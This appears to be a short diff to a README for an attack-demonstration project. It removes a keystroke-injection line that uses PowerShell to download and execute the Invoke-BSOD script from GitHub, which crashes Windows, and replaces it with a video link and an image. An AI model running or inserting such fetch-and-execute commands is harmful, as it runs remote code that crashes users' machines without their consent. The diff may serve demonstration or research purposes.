@@ -66,6 +66,10 @@ https://github.com/peewpw/Invoke-BSOD
 
 </BR>
 
-STRING powershell IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+<a href="https://www.youtube.com/watch?v=hbukCE0nQqo
+" target="_blank"><img src="https://raw.githubusercontent.com/JonnyBanana/safari-ie-reaper.github.io/master/img/css-webkit-filter-yt.JPG" 
+alt="BQOD" width="600" height="450" border="100" /></a> 
+
+
 
 </BR>
